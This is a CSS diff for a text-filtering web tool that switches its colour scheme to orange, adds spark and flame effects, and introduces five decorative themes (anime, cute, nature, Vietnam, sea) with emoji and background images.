@@ -9,52 +9,63 @@
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
 <style>
 :root{
-  --c1:#00f3ff; --c2:#ff007c; --c3:#f1c40f; --c4:#00ff87;
-  --c5:#9d00ff; --c6:#ff6b00; --bg:#07080d; --panel:rgba(12,14,20,.78);
+  --c1:#ff8c00; --c2:#ff2d55; --c3:#ffd700; --c4:#00d4ff;
+  --c5:#ff4500; --c6:#ff6b00; --bg:#07080d; --panel:rgba(12,14,20,.78);
   --glass:rgba(255,255,255,.03); --stroke:rgba(255,255,255,.08);
+  --frame:rgba(255,140,0,.4);
+  --frame-glow:rgba(255,140,0,.18);
+  --accent:#ff8c00;
 }
 *{box-sizing:border-box}
 html,body{margin:0;padding:0}
 body{
   font-family:'Rajdhani',sans-serif; color:#fff; min-height:100vh;
   padding:20px; padding-top:95px;
-  background:url('https://images.unsplash.com/photo-1605806616949-1e87b487cb2a?q=80&w=2070&auto=format&fit=crop') center/cover fixed;
+  background:url('https://images.unsplash.com/photo-1613376023733-0a73315d9b06?q=80&w=2070&auto=format&fit=crop') center/cover fixed;
   transition:background-image .6s ease;
+  cursor:crosshair;
 }
 body::before{
   content:''; position:fixed; inset:0; z-index:-1;
-  background:radial-gradient(ellipse at top,rgba(0,243,255,.08),transparent 60%),
-             radial-gradient(ellipse at bottom,rgba(255,0,124,.08),transparent 60%),
+  background:radial-gradient(ellipse at top,rgba(255,140,0,.10),transparent 60%),
+             radial-gradient(ellipse at bottom,rgba(255,45,85,.10),transparent 60%),
              rgba(0,0,0,.82);
+  transition:background .6s ease;
+}
+
+/* ====== FX CANVAS (click sparks) ====== */
+#fxCanvas{
+  position:fixed; inset:0; z-index:9996;
+  pointer-events:none; width:100%; height:100%;
 }
 
 /* ====== HEADER / SETTINGS ====== */
 .settings-container{position:fixed; top:18px; left:18px; z-index:100}
 .btn-settings{
   display:flex; align-items:center; gap:10px;
-  background:linear-gradient(135deg,rgba(0,0,0,.85),rgba(0,243,255,.1));
-  border:1px solid var(--c1); color:var(--c1);
+  background:linear-gradient(135deg,rgba(0,0,0,.85),rgba(255,140,0,.12));
+  border:1px solid var(--accent); color:var(--accent);
   padding:12px 22px; border-radius:12px;
   font-family:'Rajdhani'; font-weight:700; font-size:15px;
   letter-spacing:1.5px; cursor:pointer; backdrop-filter:blur(12px);
-  transition:all .3s; box-shadow:0 0 15px rgba(0,243,255,.2);
+  transition:all .3s; box-shadow:0 0 15px rgba(255,140,0,.2);
 }
-.btn-settings:hover{transform:translateY(-2px); box-shadow:0 0 25px rgba(0,243,255,.6)}
+.btn-settings:hover{transform:translateY(-2px); box-shadow:0 0 25px rgba(255,140,0,.6)}
 .btn-settings .gear{display:inline-block; transition:transform .6s}
 .btn-settings:hover .gear{transform:rotate(180deg)}
 
 .theme-menu{
   display:none; position:absolute; top:58px; left:0;
   background:rgba(10,12,18,.97); backdrop-filter:blur(20px);
-  border:1px solid rgba(0,243,255,.35); border-radius:14px;
-  width:255px; flex-direction:column; overflow:hidden;
-  box-shadow:0 15px 50px rgba(0,0,0,.9), 0 0 25px rgba(0,243,255,.25);
+  border:1px solid var(--frame); border-radius:14px;
+  width:275px; flex-direction:column; overflow:hidden;
+  box-shadow:0 15px 50px rgba(0,0,0,.9), 0 0 25px var(--frame-glow);
 }
 .theme-menu.show{display:flex; animation:fadeUp .3s}
 .theme-menu-header{
   padding:13px 16px; font-size:13px; font-weight:700; letter-spacing:2px;
-  color:var(--c1); background:linear-gradient(90deg,rgba(0,243,255,.2),transparent);
-  border-bottom:1px solid rgba(0,243,255,.2);
+  color:var(--accent); background:linear-gradient(90deg,var(--frame),transparent);
+  border-bottom:1px solid var(--frame);
 }
 .theme-btn{
   background:transparent; border:none; color:#fff; text-align:left;
@@ -63,30 +74,50 @@ body::before{
   display:flex; align-items:center; gap:12px;
 }
 .theme-btn:last-child{border-bottom:none}
-.theme-btn:hover{background:rgba(0,243,255,.14); padding-left:22px; color:var(--c1)}
+.theme-btn:hover{background:var(--frame-glow); padding-left:22px; color:var(--accent)}
 .theme-btn .theme-icon{font-size:22px}
 .theme-btn .theme-info{display:flex; flex-direction:column}
 .theme-btn small{font-size:11px; color:#7c8896}
 
 /* ====== TITLE ====== */
 .page-title{
+  position:relative;
   text-align:center; font-family:'Orbitron',sans-serif;
   font-size:clamp(24px,4vw,42px); font-weight:900; letter-spacing:3px;
   margin:0 0 30px; color:#fff;
-  text-shadow:0 0 8px var(--c1), 0 0 24px var(--c1), 0 0 4px #fff;
+  text-shadow:0 0 8px var(--accent), 0 0 24px var(--accent), 0 0 4px #fff;
   animation:pulseGlow 3s ease-in-out infinite;
 }
-@keyframes pulseGlow{50%{text-shadow:0 0 12px var(--c1),0 0 30px var(--c1),0 0 6px #fff}}
+.page-title::before,
+.page-title::after{
+  content:''; position:absolute; left:50%; top:50%;
+  width:120%; height:180%;
+  transform:translate(-50%,-50%);
+  background:radial-gradient(ellipse at center,var(--frame) 0%,transparent 60%);
+  filter:blur(30px); z-index:-1; pointer-events:none;
+  animation:flame 1.6s ease-in-out infinite alternate;
+  opacity:.85;
+}
+.page-title::after{
+  background:radial-gradient(ellipse at center,rgba(255,255,255,.35) 0%,transparent 55%);
+  animation-delay:-.8s; filter:blur(18px);
+}
+@keyframes flame{
+  0%{transform:translate(-50%,-50%) scale(1); opacity:.6}
+  100%{transform:translate(-50%,-55%) scale(1.15); opacity:1}
+}
+@keyframes pulseGlow{50%{text-shadow:0 0 14px var(--accent),0 0 34px var(--accent),0 0 6px #fff}}
 
 /* ====== LAYOUT ====== */
 .main-wrapper{display:flex; gap:22px; max-width:1550px; margin:0 auto; align-items:flex-start}
 
 /* ====== SIDEBAR ====== */
 .guide-sidebar{
+  position:relative;
   width:390px; flex-shrink:0; background:var(--panel); backdrop-filter:blur(20px);
   padding:26px; border-radius:18px;
-  border:1px solid rgba(255,0,124,.28);
-  box-shadow:0 0 30px rgba(255,0,124,.12);
+  border:1px solid var(--frame);
+  box-shadow:0 0 30px var(--frame-glow);
 }
 .guide-title{
   text-align:center; font-family:'Orbitron'; font-size:22px; color:var(--c2);
@@ -98,7 +129,7 @@ body::before{
   border-left:4px solid var(--c1); margin-bottom:16px;
   transition:.25s;
 }
-.guide-box:hover{background:rgba(0,243,255,.05); transform:translateX(4px)}
+.guide-box:hover{background:rgba(255,255,255,.05); transform:translateX(4px)}
 .guide-box.purple{border-left-color:var(--c5)}
 .guide-box.green{border-left-color:var(--c4)}
 .guide-box.orange{border-left-color:var(--c6); margin-bottom:0}
@@ -111,14 +142,13 @@ body::before{
 .guide-box ul{padding-left:20px; margin:0; color:#dcdde1; font-size:15.5px; line-height:1.7}
 .guide-box li{margin-bottom:8px}
 .guide-box b{color:#fff}
-.guide-box i{color:#a0aec0}
-.subtitle{color:#a0aec0; font-size:13.5px; margin:-4px 0 12px; font-style:italic}
 
 /* ====== CONTAINER ====== */
 .container{
+  position:relative;
   flex:1; background:var(--panel); backdrop-filter:blur(20px);
-  padding:30px; border-radius:18px; border:1px solid rgba(0,243,255,.28);
-  box-shadow:0 0 45px rgba(0,243,255,.14);
+  padding:30px; border-radius:18px; border:1px solid var(--frame);
+  box-shadow:0 0 45px var(--frame-glow);
   margin-bottom:30px;
 }
 
@@ -134,8 +164,8 @@ body::before{
   background:rgba(255,255,255,.04); border:1px solid rgba(255,255,255,.15);
   color:#fff; border-radius:10px; cursor:pointer; transition:.3s;
 }
-.tab-btn:hover{background:rgba(0,243,255,.08); transform:translateY(-2px)}
-.tab-btn.active{background:rgba(0,243,255,.18); border-color:var(--c1); color:var(--c1); box-shadow:0 0 18px rgba(0,243,255,.45)}
+.tab-btn:hover{background:var(--frame-glow); transform:translateY(-2px)}
+.tab-btn.active{background:var(--frame-glow); border-color:var(--c1); color:var(--c1); box-shadow:0 0 18px var(--frame-glow)}
 .tab-btn.active-purple{background:rgba(157,0,255,.18); border-color:var(--c5); color:#d896ff; box-shadow:0 0 18px rgba(157,0,255,.45)}
 .tab-btn.active-green{background:rgba(0,255,135,.18); border-color:var(--c4); color:var(--c4); box-shadow:0 0 18px rgba(0,255,135,.45)}
 .tab-btn.active-orange{background:rgba(255,107,0,.18); border-color:var(--c6); color:var(--c6); box-shadow:0 0 18px rgba(255,107,0,.45)}
@@ -145,15 +175,23 @@ body::before{
 .tab-content.active{display:block}
 @keyframes fadeUp{from{opacity:0; transform:translateY(12px)} to{opacity:1; transform:translateY(0)}}
 
-/* ====== PANELS ====== */
-.control-panel{display:grid; grid-template-columns:1fr 1fr 1fr; gap:14px; margin-bottom:18px}
+/* ====== PANELS & UNIFIED FILTER ====== */
 .control-panel-2{display:flex; gap:15px; margin-bottom:20px; flex-wrap:wrap; justify-content:center}
 .control-group{
   background:var(--glass); padding:16px; border-radius:12px;
-  border:1px dashed rgba(0,243,255,.22);
+  border:1px dashed var(--frame);
   display:flex; flex-direction:column; gap:10px;
 }
 .group-title{font-weight:700; font-size:16px; letter-spacing:1px}
+
+/* Unified Filter Grid for Tab 1 */
+.filter-grid{
+  display:grid; grid-template-columns:repeat(auto-fit, minmax(200px, 1fr)); gap:12px; margin-top:6px;
+}
+.filter-item{display:flex; flex-direction:column; gap:6px}
+.filter-item label{font-size:14px; font-weight:700; color:var(--c1)}
+.op-input{display:flex; gap:6px}
+.op-input select{width:75px; font-weight:700; color:var(--c1); background:rgba(0,0,0,.85); border-color:var(--frame)}
 
 input[type="file"], select, input[type="number"], input[type="text"], textarea{
   font-family:'Rajdhani'; font-size:16px;
@@ -161,7 +199,7 @@ input[type="file"], select, input[type="number"], input[type="text"], textarea{
   color:#fff; padding:11px; border-radius:8px; outline:none;
   transition:.3s; width:100%;
 }
-input:focus, select:focus, textarea:focus{border-color:var(--c1); box-shadow:0 0 12px rgba(0,243,255,.3)}
+input:focus, select:focus, textarea:focus{border-color:var(--accent); box-shadow:0 0 12px var(--frame-glow)}
 input[type="file"]::file-selector-button{
   background:#2d3436; color:#fff; border:none; padding:6px 12px;
   border-radius:5px; cursor:pointer; font-family:'Rajdhani'; font-weight:700;
@@ -169,21 +207,27 @@ input[type="file"]::file-selector-button{
 textarea{resize:vertical; min-height:180px; font-family:'Share Tech Mono',monospace; font-size:14px}
 
 button.action-btn{
+  position:relative;
   font-family:'Rajdhani'; font-size:16px; font-weight:700;
   padding:12px 18px; text-transform:uppercase; letter-spacing:1px;
   border:none; border-radius:9px; cursor:pointer; transition:.3s; color:#fff; width:100%;
+  overflow:hidden;
 }
-.btn-search{background:linear-gradient(45deg,#00d2ff,#3a7bd5)}
-.btn-filter{background:linear-gradient(45deg,#ff007c,#8a2387)}
-.btn-skin{background:linear-gradient(45deg,#f1c40f,#e67e22)}
-.btn-cut{background:linear-gradient(45deg,#9d00ff,#4a00e0); font-size:17px; padding:14px}
+.btn-filter{background:linear-gradient(45deg,var(--c2),#8a2387)}
+.btn-cut{background:linear-gradient(45deg,var(--c5),#4a00e0); font-size:17px; padding:14px}
 .btn-dedup{background:linear-gradient(45deg,#ff0099,#493240); font-size:17px; padding:14px}
 .btn-txt{background:linear-gradient(45deg,#00b09b,#96c93d); font-size:17px; padding:14px}
 button.action-btn:hover{transform:translateY(-2px); filter:brightness(1.15); box-shadow:0 8px 20px rgba(0,0,0,.4)}
+button.action-btn::after{
+  content:''; position:absolute; top:0; left:-60%; width:50%; height:100%;
+  background:linear-gradient(120deg,transparent,rgba(255,255,255,.35),transparent);
+  transform:skewX(-20deg); transition:left .6s;
+}
+button.action-btn:hover::after{left:130%}
 
 .radio-group{display:flex; gap:18px; align-items:center; justify-content:center; flex-wrap:wrap; padding:10px; font-size:17px}
 .radio-group label{cursor:pointer; display:flex; align-items:center; gap:6px; font-weight:600}
-.radio-group input[type="radio"]{width:18px; height:18px; accent-color:var(--c5); cursor:pointer}
+.radio-group input[type="radio"]{width:18px; height:18px; accent-color:var(--accent); cursor:pointer}
 
 /* ====== DISPLAY ====== */
 .displayArea{
@@ -205,8 +249,8 @@ button.action-btn:hover{transform:translateY(-2px); filter:brightness(1.15); box
 }
 .btn-copy-all{background:rgba(0,255,135,.15); border:1px solid var(--c4); color:var(--c4)}
 .btn-copy-all:hover{background:var(--c4); color:#000}
-.btn-export{background:rgba(0,243,255,.15); border:1px solid var(--c1); color:var(--c1)}
-.btn-export:hover{background:var(--c1); color:#000}
+.btn-export{background:rgba(255,140,0,.15); border:1px solid var(--accent); color:var(--accent)}
+.btn-export:hover{background:var(--accent); color:#000}
 
 .acc-line{
   display:flex; justify-content:space-between; align-items:flex-start;
@@ -214,7 +258,7 @@ button.action-btn:hover{transform:translateY(-2px); filter:brightness(1.15); box
   background:rgba(255,255,255,.02); border-radius:8px;
   border-left:3px solid transparent; gap:14px; transition:.2s;
 }
-.acc-line:hover{background:rgba(255,255,255,.06); border-left-color:var(--c1)}
+.acc-line:hover{background:rgba(255,255,255,.06); border-left-color:var(--accent)}
 .acc-content{flex:1; word-break:break-word}
 .btn-copy-single{
   background:#2d3436; color:#fff; border:1px solid #636e72;
@@ -225,12 +269,10 @@ button.action-btn:hover{transform:translateY(-2px); filter:brightness(1.15); box
 .btn-copy-single:hover{background:#fff; color:#000; border-color:#fff}
 
 .highlight{color:#000; background:var(--c2); padding:2px 6px; border-radius:4px; font-weight:700}
-.highlight-vip{color:#000; background:var(--c3); padding:2px 6px; border-radius:4px; font-weight:700}
-.highlight-skin{color:#000; background:var(--c4); padding:2px 6px; border-radius:4px; font-weight:700}
 
 /* ====== MINI GUIDE ====== */
 .guide-box-mini{
-  background:rgba(255,107,0,.06); padding:16px 20px;
+  background:var(--frame-glow); padding:16px 20px;
   border-radius:12px; border-left:4px solid var(--c6);
   margin-bottom:18px;
 }
@@ -240,20 +282,20 @@ button.action-btn:hover{transform:translateY(-2px); filter:brightness(1.15); box
 
 /* ====== FILE LIST ====== */
 .file-list-box{
-  background:rgba(0,0,0,.5); border:1px dashed rgba(255,107,0,.4);
+  background:rgba(0,0,0,.5); border:1px dashed var(--frame);
   border-radius:10px; padding:8px 12px; max-height:240px; overflow-y:auto;
   font-family:'Share Tech Mono',monospace; font-size:13px;
 }
 .file-list-box::-webkit-scrollbar{width:6px}
-.file-list-box::-webkit-scrollbar-thumb{background:rgba(255,107,0,.5); border-radius:3px}
+.file-list-box::-webkit-scrollbar-thumb{background:var(--accent); border-radius:3px}
 .file-item{
   display:flex; justify-content:space-between; align-items:center;
   padding:8px 6px; border-bottom:1px solid rgba(255,255,255,.05); gap:10px;
 }
 .file-item:last-child{border-bottom:none}
 .file-item .idx{
-  color:var(--c6); font-weight:700; min-width:30px; text-align:center;
-  background:rgba(255,107,0,.15); border-radius:5px; padding:2px 0;
+  color:var(--accent); font-weight:700; min-width:30px; text-align:center;
+  background:var(--frame-glow); border-radius:5px; padding:2px 0;
 }
 .file-item .fname{flex:1; word-break:break-all; color:#fff}
 .file-item .fmeta{color:#a0aec0; font-size:12px; white-space:nowrap}
@@ -278,18 +320,18 @@ button.action-btn:hover{transform:translateY(-2px); filter:brightness(1.15); box
 /* ====== TOAST ====== */
 .toast{
   position:fixed; bottom:30px; right:30px;
-  background:rgba(0,0,0,.92); border:2px solid var(--c1);
+  background:rgba(0,0,0,.92); border:2px solid var(--accent);
   border-radius:12px; padding:15px 24px; color:#fff;
   font-size:16px; font-weight:600;
-  box-shadow:0 0 30px rgba(0,243,255,.6);
+  box-shadow:0 0 30px var(--frame-glow);
   z-index:9998; animation:toastIn .4s ease-out;
 }
-.toast b{color:var(--c1)}
+.toast b{color:var(--accent)}
 @keyframes toastIn{from{opacity:0; transform:translateY(20px)} to{opacity:1; transform:translateY(0)}}
 
 .limit-note{
   text-align:center; padding:14px; margin-top:8px;
-  background:rgba(0,243,255,.06); border-radius:8px;
+  background:var(--frame-glow); border-radius:8px;
   color:#7c8896; font-style:italic; font-size:14px;
 }
 
@@ -301,33 +343,417 @@ button.action-btn:hover{transform:translateY(-2px); filter:brightness(1.15); box
   backdrop-filter:blur(6px); padding:20px;
 }
 .modal-content{
-  background:var(--panel); border:2px solid var(--c1);
+  background:var(--panel); border:2px solid var(--accent);
   padding:32px 40px; border-radius:18px; max-width:660px;
-  text-align:center; box-shadow:0 0 40px rgba(0,243,255,.4);
+  text-align:center; box-shadow:0 0 40px var(--frame-glow);
   animation:fadeUp .4s;
 }
-.modal-content h3{color:var(--c1); margin-top:0; font-size:26px; font-family:'Orbitron'; letter-spacing:2px}
+.modal-content h3{color:var(--accent); margin-top:0; font-size:26px; font-family:'Orbitron'; letter-spacing:2px}
 .modal-content p{font-size:18px; line-height:1.65; color:#e0e0e0; margin-bottom:14px}
 .modal-content a{color:var(--c2); font-weight:700; text-decoration:none; word-break:break-all}
 .modal-content a:hover{color:var(--c3)}
 .modal-btn{
   margin-top:18px; padding:13px 38px;
-  background:linear-gradient(45deg,#00f3ff,#0051ff);
+  background:linear-gradient(45deg,var(--accent),var(--c2));
   color:#fff; border:none; border-radius:10px;
   font-weight:700; font-size:17px; cursor:pointer;
   font-family:'Rajdhani'; text-transform:uppercase; letter-spacing:1px;
   transition:.3s;
 }
-.modal-btn:hover{transform:scale(1.05); box-shadow:0 0 20px var(--c1)}
+.modal-btn:hover{transform:scale(1.05); box-shadow:0 0 20px var(--accent)}
 
 @media (max-width:1050px){
   .main-wrapper{flex-direction:column}
   .guide-sidebar{width:100%}
-  .control-panel{grid-template-columns:1fr}
+}
+
+/* ============================================================
+   THEME OVERRIDES
+   ============================================================ */
+
+/* ---------- ANIME (One Piece / Naruto) ---------- */
+body.theme-anime{
+  --c1:#ffb400; --c2:#ff3d2e; --c3:#ffd700; --c4:#00d4ff;
+  --c5:#ff7a00; --c6:#ff5500;
+  --frame:rgba(255,140,0,.5);
+  --frame-glow:rgba(255,140,0,.22);
+  --accent:#ffb400;
+  background-image:url('https://images.unsplash.com/photo-1613376023733-0a73315d9b06?q=80&w=2070&auto=format&fit=crop');
+}
+body.theme-anime::before{
+  background:
+    radial-gradient(ellipse at 15% 10%,rgba(255,120,0,.18),transparent 55%),
+    radial-gradient(ellipse at 85% 90%,rgba(255,60,60,.15),transparent 55%),
+    linear-gradient(135deg,rgba(0,0,0,.88),rgba(20,8,0,.88));
+}
+body.theme-anime .container::before{
+  content:'⚔️'; position:absolute; top:10px; left:14px; font-size:22px;
+  filter:drop-shadow(0 0 8px #ff8c00); opacity:.85; pointer-events:none;
+}
+body.theme-anime .container::after{
+  content:'🍥'; position:absolute; top:10px; right:14px; font-size:22px;
+  filter:drop-shadow(0 0 8px #ff3d2e); opacity:.85; pointer-events:none;
+}
+body.theme-anime .guide-sidebar::before{
+  content:'🌀'; position:absolute; top:8px; left:12px; font-size:20px;
+  filter:drop-shadow(0 0 8px #00d4ff); opacity:.85; pointer-events:none;
+}
+body.theme-anime .guide-sidebar::after{
+  content:'👒'; position:absolute; top:8px; right:12px; font-size:20px;
+  filter:drop-shadow(0 0 8px #ffd700); opacity:.85; pointer-events:none;
+}
+body.theme-anime .action-btn,
+body.theme-anime .btn-filter{
+  background:linear-gradient(135deg,#ff3d2e 0%,#ff8c00 50%,#ffd700 100%) !important;
+  border:1px solid #ffd700;
+  box-shadow:0 0 18px rgba(255,140,0,.45),inset 0 0 12px rgba(255,255,255,.18);
+  text-shadow:0 0 8px rgba(0,0,0,.6);
+}
+body.theme-anime .tab-btn.active{
+  background:linear-gradient(135deg,#ff3d2e,#ffb400);
+  color:#1a0a00; border-color:#ffd700;
+  box-shadow:0 0 22px rgba(255,180,0,.7);
+}
+body.theme-anime .container,
+body.theme-anime .guide-sidebar{
+  border-width:2px;
+  border-image:linear-gradient(135deg,#ff3d2e,#ffb400,#ffd700,#ff3d2e) 1;
+  border-radius:14px;
+  box-shadow:0 0 55px rgba(255,140,0,.28),inset 0 0 30px rgba(255,140,0,.08);
+}
+
+/* ---------- CUTE (Bánh su kem / Dâu / Cinamoroll) ---------- */
+body.theme-cute{
+  --c1:#ff8ec7; --c2:#ff5fa2; --c3:#ffe066; --c4:#a8e6cf;
+  --c5:#c084fc; --c6:#ffb6d5;
+  --frame:rgba(255,142,199,.55);
+  --frame-glow:rgba(255,182,213,.28);
+  --accent:#ff8ec7;
+  background-image:url('https://images.unsplash.com/photo-1578339591410-b98a08d24eb0?q=80&w=2070&auto=format&fit=crop');
+}
+body.theme-cute::before{
+  background:
+    radial-gradient(ellipse at 20% 15%,rgba(255,180,220,.22),transparent 60%),
+    radial-gradient(ellipse at 80% 85%,rgba(190,230,255,.22),transparent 60%),
+    linear-gradient(135deg,rgba(60,20,45,.85),rgba(30,10,25,.9));
+}
+body.theme-cute .container::before{
+  content:'🍓'; position:absolute; top:10px; left:14px; font-size:22px;
+  filter:drop-shadow(0 0 6px #ff8ec7); opacity:.9; pointer-events:none;
+}
+body.theme-cute .container::after{
+  content:'🧁'; position:absolute; top:10px; right:14px; font-size:22px;
+  filter:drop-shadow(0 0 6px #ff8ec7); opacity:.9; pointer-events:none;
+}
+body.theme-cute .guide-sidebar::before{
+  content:'🐰'; position:absolute; top:8px; left:12px; font-size:20px; pointer-events:none;
+}
+body.theme-cute .guide-sidebar::after{
+  content:'🍰'; position:absolute; top:8px; right:12px; font-size:20px; pointer-events:none;
+}
+body.theme-cute .action-btn,
+body.theme-cute .btn-filter,
+body.theme-cute .btn-txt,
+body.theme-cute .btn-cut,
+body.theme-cute .btn-dedup{
+  background:linear-gradient(135deg,#ffb6d5,#ff8ec7 55%,#ff5fa2) !important;
+  border-radius:30px !important;
+  border:2px solid #fff;
+  box-shadow:0 6px 18px rgba(255,150,200,.55),inset 0 0 20px rgba(255,255,255,.4);
+  color:#5b1536;
+  font-weight:700;
+  text-shadow:none;
+}
+body.theme-cute .action-btn::before{content:'🍓 '}
+body.theme-cute .btn-txt::before{content:'🍰 '}
+body.theme-cute .btn-cut::before{content:'🌸 '}
+body.theme-cute .btn-dedup::before{content:'🍩 '}
+body.theme-cute .btn-filter::before{content:'🧁 '}
+body.theme-cute .tab-btn.active{
+  background:linear-gradient(135deg,#ffd1e8,#ff8ec7);
+  color:#5b1536; border-color:#fff;
+  box-shadow:0 0 22px rgba(255,142,199,.8);
+}
+body.theme-cute .container,
+body.theme-cute .guide-sidebar{
+  border-width:3px;
+  border-color:#ffd1e8;
+  border-style:dashed;
+  border-radius:30px;
+  box-shadow:0 0 45px rgba(255,182,213,.35),inset 0 0 40px rgba(255,182,213,.12);
+  background-image:
+    radial-gradient(circle at 12px 12px,rgba(255,255,255,.06) 2px,transparent 2px),
+    radial-gradient(circle at 36px 36px,rgba(255,255,255,.04) 2px,transparent 2px);
+  background-size:48px 48px;
+}
+body.theme-cute .guide-box{border-radius:20px}
+
+/* ---------- THIÊN NHIÊN ---------- */
+body.theme-thiennhien{
+  --c1:#7bd389; --c2:#2e8b57; --c3:#d4e157; --c4:#26a69a;
+  --c5:#66bb6a; --c6:#8bc34a;
+  --frame:rgba(123,211,137,.45);
+  --frame-glow:rgba(123,211,137,.2);
+  --accent:#7bd389;
+  background-image:url('https://images.unsplash.com/photo-1441974231531-c6227db76b6e?q=80&w=2071&auto=format&fit=crop');
+}
+body.theme-thiennhien::before{
+  background:
+    radial-gradient(ellipse at 20% 10%,rgba(120,220,140,.15),transparent 60%),
+    radial-gradient(ellipse at 80% 90%,rgba(60,150,90,.18),transparent 60%),
+    linear-gradient(135deg,rgba(5,20,10,.85),rgba(0,10,5,.9));
+}
+body.theme-thiennhien .container::before{
+  content:'🌿'; position:absolute; top:10px; left:14px; font-size:22px;
+  filter:drop-shadow(0 0 6px #7bd389); opacity:.9; pointer-events:none;
+}
+body.theme-thiennhien .container::after{
+  content:'🍃'; position:absolute; top:10px; right:14px; font-size:22px;
+  filter:drop-shadow(0 0 6px #7bd389); opacity:.9; pointer-events:none;
+}
+body.theme-thiennhien .guide-sidebar::before{
+  content:'🌱'; position:absolute; top:8px; left:12px; font-size:20px; pointer-events:none;
+}
+body.theme-thiennhien .guide-sidebar::after{
+  content:'🦋'; position:absolute; top:8px; right:12px; font-size:20px; pointer-events:none;
+}
+body.theme-thiennhien .action-btn,
+body.theme-thiennhien .btn-filter,
+body.theme-thiennhien .btn-txt,
+body.theme-thiennhien .btn-cut,
+body.theme-thiennhien .btn-dedup{
+  background:linear-gradient(135deg,#2e8b57,#7bd389) !important;
+  border-radius:14px;
+  border:1px solid #d4e157;
+  box-shadow:0 4px 16px rgba(60,150,90,.45),inset 0 0 14px rgba(255,255,255,.15);
+  text-shadow:0 0 6px rgba(0,0,0,.4);
+}
+body.theme-thiennhien .tab-btn.active{
+  background:linear-gradient(135deg,#2e8b57,#7bd389);
+  color:#04160b; border-color:#d4e157;
+  box-shadow:0 0 22px rgba(123,211,137,.7);
+}
+body.theme-thiennhien .container,
+body.theme-thiennhien .guide-sidebar{
+  border-width:2px;
+  border-color:rgba(123,211,137,.6);
+  box-shadow:0 0 45px rgba(123,211,137,.22),inset 0 0 40px rgba(123,211,137,.08);
+}
+
+/* ---------- VIỆT NAM (Trống đồng) ---------- */
+body.theme-vietnam{
+  --c1:#ffd700; --c2:#da251d; --c3:#fff200; --c4:#ffd700;
+  --c5:#da251d; --c6:#ff4500;
+  --frame:rgba(218,37,29,.55);
+  --frame-glow:rgba(255,215,0,.22);
+  --accent:#ffd700;
+  background-image:url('https://images.unsplash.com/photo-1528127269322-539801943592?q=80&w=2070&auto=format&fit=crop');
+}
+body.theme-vietnam::before{
+  background:
+    radial-gradient(ellipse at 15% 10%,rgba(218,37,29,.22),transparent 55%),
+    radial-gradient(ellipse at 85% 90%,rgba(255,215,0,.18),transparent 55%),
+    linear-gradient(135deg,rgba(40,0,0,.9),rgba(20,0,0,.92));
+}
+body.theme-vietnam .container::before{
+  content:'🥁'; position:absolute; top:10px; left:14px; font-size:22px;
+  filter:drop-shadow(0 0 6px #ffd700); opacity:.9; pointer-events:none;
+}
+body.theme-vietnam .container::after{
+  content:'⭐'; position:absolute; top:10px; right:14px; font-size:22px;
+  filter:drop-shadow(0 0 6px #ffd700); opacity:.9; pointer-events:none;
+}
+body.theme-vietnam .guide-sidebar::before{
+  content:'🇻🇳'; position:absolute; top:8px; left:12px; font-size:20px; pointer-events:none;
+}
+body.theme-vietnam .guide-sidebar::after{
+  content:'🎋'; position:absolute; top:8px; right:12px; font-size:20px; pointer-events:none;
+}
+body.theme-vietnam .action-btn,
+body.theme-vietnam .btn-filter,
+body.theme-vietnam .btn-txt,
+body.theme-vietnam .btn-cut,
+body.theme-vietnam .btn-dedup{
+  background:linear-gradient(135deg,#da251d,#ffd700) !important;
+  border:1.5px solid #fff200;
+  box-shadow:0 0 18px rgba(255,215,0,.45),inset 0 0 14px rgba(255,255,255,.2);
+  text-shadow:0 0 6px rgba(0,0,0,.5);
+}
+body.theme-vietnam .tab-btn.active{
+  background:linear-gradient(135deg,#da251d,#ffd700);
+  color:#2b0000; border-color:#fff200;
+  box-shadow:0 0 22px rgba(255,215,0,.7);
+}
+body.theme-vietnam .container,
+body.theme-vietnam .guide-sidebar{
+  border-width:2px;
+  border-color:#ffd700;
+  box-shadow:0 0 45px rgba(218,37,29,.35),inset 0 0 40px rgba(255,215,0,.06);
+  background-image:
+    radial-gradient(circle at 50% 50%,rgba(255,215,0,.05) 0 20px,transparent 22px),
+    radial-gradient(circle at 50% 50%,rgba(255,215,0,.05) 0 40px,transparent 42px),
+    radial-gradient(circle at 50% 50%,rgba(255,215,0,.05) 0 60px,transparent 62px);
+}
+
+/* ---------- BIỂN (Sóng nước) ---------- */
+body.theme-bien{
+  --c1:#00d4ff; --c2:#0088cc; --c3:#ffe066; --c4:#7fe7ff;
+  --c5:#0066cc; --c6:#00bcd4;
+  --frame:rgba(0,212,255,.5);
+  --frame-glow:rgba(0,212,255,.22);
+  --accent:#00d4ff;
+  background-image:url('https://images.unsplash.com/photo-1507525428034-b723cf961d3e?q=80&w=2073&auto=format&fit=crop');
+}
+body.theme-bien::before{
+  background:
+    radial-gradient(ellipse at 20% 10%,rgba(0,180,255,.18),transparent 60%),
+    radial-gradient(ellipse at 80% 90%,rgba(0,110,200,.22),transparent 60%),
+    linear-gradient(135deg,rgba(0,15,35,.85),rgba(0,5,20,.9));
+}
+body.theme-bien .container::before{
+  content:'🐚'; position:absolute; top:10px; left:14px; font-size:22px;
+  filter:drop-shadow(0 0 6px #00d4ff); opacity:.9; pointer-events:none;
+}
+body.theme-bien .container::after{
+  content:'⛵'; position:absolute; top:10px; right:14px; font-size:22px;
+  filter:drop-shadow(0 0 6px #00d4ff); opacity:.9; pointer-events:none;
+}
+body.theme-bien .guide-sidebar::before{
+  content:'🌊'; position:absolute; top:8px; left:12px; font-size:20px; pointer-events:none;
+}
+body.theme-bien .guide-sidebar::after{
+  content:'🐬'; position:absolute; top:8px; right:12px; font-size:20px; pointer-events:none;
+}
+body.theme-bien .action-btn,
+body.theme-bien .btn-filter,
+body.theme-bien .btn-txt,
+body.theme-bien .btn-cut,
+body.theme-bien .btn-dedup{
+  background:
+    radial-gradient(ellipse at 20% 30%,rgba(255,255,255,.35),transparent 40%),
+    linear-gradient(135deg,#0066cc,#00d4ff 55%,#7fe7ff) !important;
+  border:1px solid #7fe7ff;
+  border-radius:14px;
+  box-shadow:0 6px 22px rgba(0,180,255,.5),inset 0 0 22px rgba(255,255,255,.2);
+  text-shadow:0 0 8px rgba(0,20,40,.6);
+  animation:waveBtn 3s ease-in-out infinite;
+}
+@keyframes waveBtn{
+  0%,100%{background-position:0% 50%}
+  50%{background-position:100% 50%}
+}
+body.theme-bien .tab-btn.active{
+  background:linear-gradient(135deg,#0066cc,#00d4ff);
+  color:#001a2c; border-color:#7fe7ff;
+  box-shadow:0 0 22px rgba(0,212,255,.75);
+}
